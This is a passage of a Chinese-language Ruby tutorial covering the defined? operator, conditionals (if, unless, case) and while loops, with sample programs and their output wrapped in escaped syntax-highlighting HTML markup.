class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# True if variable is initialized&lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;foo &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;42&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; foo&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;local-variable&quot;&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $_&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;global-variable&quot;&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; bar&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (undefined)&lt;/span&gt;9. &lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;10. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; method_call &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# True if a method is defined&lt;/span&gt;11. &lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;12. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;13. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;method&quot;&lt;/span&gt;14. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bar&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (bar is not defined here)&lt;/span&gt;15. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; unpack&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (not defined here)&lt;/span&gt;16. &lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;17. &lt;span class=&quot;com&quot;&gt;# True if a method exists that can be called with super user&lt;/span&gt;18. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; super&lt;/span&gt;19. &lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;20. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;21. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; super&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;super&quot; (if it can be called)&lt;/span&gt;22. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; super&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (if it cannot be)&lt;/span&gt;23. &lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;24. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; yield&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# True if a code block has been passed&lt;/span&gt;25. &lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;26. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;27. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; yield&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;yield&quot; (if there is a block passed)&lt;/span&gt;28. &lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; yield&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (if there is no block)&lt;/span&gt; 7.逻辑结构if…else 语句：1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;4. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; x &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is greater than 2&quot;&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;elsif x &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; and x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is 1&quot;&lt;/span&gt;8. &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;I can&#39;t guess the number&quot;&lt;/span&gt;10. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;11. &lt;span class=&quot;pln&quot;&gt;x is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;单if：1. &lt;span class=&quot;pln&quot;&gt;code &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; condition&lt;/span&gt;2. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;条件为真执行代码。&lt;/span&gt;1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$debug&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;debug\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $debug&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;pln&quot;&gt;debug&lt;/span&gt;unless else：1. &lt;span class=&quot;pln&quot;&gt;unless conditional &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;如果条件为false，执行代码。如果条件是true，else子句中指定的代码被执行。例如：1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;unless x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is less than 2&quot;&lt;/span&gt;5. &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is greater than 2&quot;&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;pln&quot;&gt;x is less than &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;单unless：1. &lt;span class=&quot;pln&quot;&gt;code unless conditional&lt;/span&gt;执行代码，如果有条件的话为false。实例:1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$var &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;1 -- Value is set\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $var&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;2 -- Value is set\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; unless $var&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;$var &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;3 -- Value is set\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; unless $var&lt;/span&gt;这将产生以下结果：&nbsp;1. &lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;2. &lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;case：1. &lt;span class=&quot;kwd&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expression&lt;/span&gt;2. &lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;when expression &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expression &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]...&lt;/span&gt;4. &lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;比较表达式指定的情况下，使用===运算符时，按指定的条款相匹配时执行的代码。子句计算 when 与左操作数指定的表达式。如果没有子句匹配时，情况下执行的代码else子句。when 语句的表达保留字，那么，一个换行符或分号分开代码。那么:1. &lt;span class=&quot;kwd&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr0&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;when expr1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr2&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt1&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;when expr3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr4&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt2&lt;/span&gt;6. &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt3&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;基本上类似于以下内容：1. &lt;span class=&quot;pln&quot;&gt;_tmp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr0&lt;/span&gt;2. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr1 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr2 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt1&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;elsif expr3 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr4 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt2&lt;/span&gt;6. &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt3&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;例子：1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$age &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;4. &lt;span class=&quot;kwd&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $age&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;baby&quot;&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;6&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;little child&quot;&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;10. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;child&quot;&lt;/span&gt;11. &lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;18&lt;/span&gt;12. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;youth&quot;&lt;/span&gt;13. &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;14. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;adult&quot;&lt;/span&gt;15. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;pln&quot;&gt;little child&lt;/span&gt;while：语法1:1. &lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; conditional &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;6. &lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;语法2:1. &lt;span class=&quot;pln&quot;&gt;code &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; condition&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp; code&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;end &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; conditional&lt;/span&gt;执行代码，当条件为true。如果while 修饰符紧跟一个begin 语句但是没有 rescue 或 ensure 子句, 代码被执行前一次条件求值。1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;end &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span 